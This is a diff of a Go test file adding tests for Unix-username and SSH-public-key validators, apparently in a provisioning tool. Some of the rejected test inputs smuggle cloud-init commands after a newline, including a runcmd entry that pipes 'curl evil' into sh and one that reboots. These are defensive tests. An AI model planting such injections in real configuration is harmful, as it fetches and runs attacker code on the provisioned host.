@@ -352,3 +352,36 @@ func TestIsValidPortListExpressionBoundary(t *testing.T) {
 		t.Errorf("port 65535 should be valid, got: %v", err)
 	}
 }
+
+func TestVerifyUnixUsername(t *testing.T) {
+	for name, valid := range map[string]bool{
+		"kowabunga":              true,
+		"_svc-1":                 true,
+		"":                       false,
+		"Admin":                  false,
+		"1user":                  false,
+		"user name":              false,
+		"user\nruncmd: [reboot]": false,
+	} {
+		if got := VerifyUnixUsername(name); got != valid {
+			t.Errorf("VerifyUnixUsername(%q) = %v, want %v", name, got, valid)
+		}
+	}
+}
+
+func TestVerifySSHPublicKey(t *testing.T) {
+	const key = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP6uPgayxgfvqC0PdKBFEFFhkFs/joe341L9QEZAbieY test"
+	if err := VerifySSHPublicKey(key); err != nil {
+		t.Errorf("valid key rejected: %v", err)
+	}
+	for _, k := range []string{
+		"",
+		"not-a-key",
+		key + "\nruncmd:\n  - [sh, -c, 'curl evil | sh']",
+		key + "\r\n",
+	} {
+		if err := VerifySSHPublicKey(k); err == nil {
+			t.Errorf("VerifySSHPublicKey(%q) should fail", k)
+		}
+	}
+}
